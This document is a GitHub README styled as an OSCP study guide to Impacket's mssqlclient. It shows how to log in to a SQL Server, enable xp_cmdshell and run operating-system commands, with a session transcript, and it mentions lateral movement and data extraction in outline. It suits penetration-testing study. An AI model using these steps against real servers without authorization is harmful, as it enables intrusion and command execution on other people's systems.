#  Penetration Testing with Impacket MSSQLClient "OSCP Guide"

This repository provides a comprehensive guide on how to perform advanced penetration testing using the Impacket `mssqlclient` tool. This guide covers the setup, configuration, and advanced usage scenarios for effective penetration testing.

## Table of Contents

1. [Introduction](#introduction)
2. [Installation](#installation)
3. [Connecting to a SQL Server](#connecting-to-a-sql-server)
4. [Enabling Advanced Options](#enabling-advanced-options)
5. [Executing Commands](#executing-commands)
6. [Advanced Usage](#advanced-usage)
7. [Security Considerations](#security-considerations)
8. [Resources](#resources)
9. [Contributing](#contributing)
10. [License](#license)

## Introduction

Impacket is a collection of Python classes for working with network protocols. `mssqlclient` is a tool within the Impacket suite designed to interact with Microsoft SQL Server. This guide provides advanced techniques for leveraging `mssqlclient` in penetration testing scenarios.

## Installation

To install Impacket, you need to have Python and pip installed. Follow these steps to install Impacket:

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
```

## Connecting to a SQL Server

Use `mssqlclient` to connect to a SQL Server instance:

```bash
impacket-mssqlclient <username>:<password>@<hostname> -windows-auth
```

Example:

```bash
impacket-mssqlclient Malek:pass18113@192.168.212.182 -windows-auth
```

```plaintext
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SQLPLAYGROUND\Malek  dbo@master)> dir
ERROR: Line 1: Could not find stored procedure 'dir'.
SQL (SQLPLAYGROUND\Malek  dbo@master)> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SQLPLAYGROUND\Malek  dbo@master)> RECONFIGURE;
SQL (SQLPLAYGROUND\Malek  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SQLPLAYGROUND\Malek  dbo@master)> RECONFIGURE;
SQL (SQLPLAYGROUND\Malek  dbo@master)> EXECUTE xp_cmdshell 'whoami';
output                        
---------------------------   
nt service\mssql$sqlexpress   

NULL                          
SQL (SQLPLAYGROUND\Malek  dbo@master)>
```

## Enabling Advanced Options

Before you can use certain advanced features like `xp_cmdshell`, you need to enable advanced options on the SQL Server.

### Step-by-Step Guide

1. **Enable advanced options**:
    ```sql
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    ```

2. **Enable xp_cmdshell**:
    ```sql
    EXEC sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    ```

## Executing Commands

Once `xp_cmdshell` is enabled, you can execute system commands directly from the SQL Server.

### Example Commands

- **Check the current user**:
    ```sql
    EXEC xp_cmdshell 'whoami';
    ```

- **List directory contents**:
    ```sql
    EXEC xp_cmdshell 'dir';
    ```

- **Create a new directory**:
    ```sql
    EXEC xp_cmdshell 'mkdir C:\path\to\new_directory';
    ```

## Advanced Usage

Here are some advanced scenarios and techniques for using `mssqlclient`:

- **Uploading and Executing Scripts**:
    You can upload and execute scripts or binaries using `xp_cmdshell`.

- **Pivoting and Lateral Movement**:
    Use `mssqlclient` in combination with other tools to pivot and move laterally within the network.

- **Extracting Data**:
    Use SQL queries to extract sensitive data from the database.

## Security Considerations

Using tools like `mssqlclient` comes with significant security risks. Here are some considerations:

- Ensure you have proper authorization before performing penetration tests.
- Be aware of the potential impact of your actions on the target systems.
- Follow responsible disclosure practices if you discover vulnerabilities.

## Resources

- [Impacket GitHub Repository](https://github.com/fortra/impacket)
- [SQL Server Documentation](https://docs.microsoft.com/en-us/sql/sql-server/)


## Refrence 

Offsec 
```

You can copy and paste this markdown content directly into your `README.md` file on GitHub.
